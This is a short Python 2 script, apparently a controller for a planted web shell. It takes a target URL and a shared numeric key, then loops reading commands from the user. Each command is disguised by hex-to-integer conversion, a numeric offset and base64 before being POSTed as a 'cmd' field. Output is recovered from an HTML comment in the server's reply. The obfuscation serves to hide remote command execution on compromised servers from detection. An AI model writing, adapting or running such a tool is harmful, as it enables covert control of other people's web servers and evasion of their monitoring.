
#programed by Majid AL Maashari
#Email : omanras@gmail.com
import requests
from base64 import b64encode, b64decode
import base64
import binascii
url = raw_input("Enter the url:")
random = raw_input("Enter the random number:")

def logic(url,random):
    data = raw_input("Enter command: ")
    random = int(random)
    hexcode= data.encode('hex')
    hexdec = int(hexcode, 16)
    encoded_cipher = hexdec + random
    encode = b64encode(str(encoded_cipher))
    print(encode)
    r = requests.post(url, data ={'cmd':encode}) 

    txt = r.content.split("<!--")
    txt = txt[1].split("-->")
    data = txt[0]
    cipher = b64decode(data)
    cipher = int(cipher) - random
    dechex = '{0:x}'.format(int(cipher))
    hexdecode = dechex.decode('hex')
    print(hexdecode)
    return logic(url,random)
logic(url,random)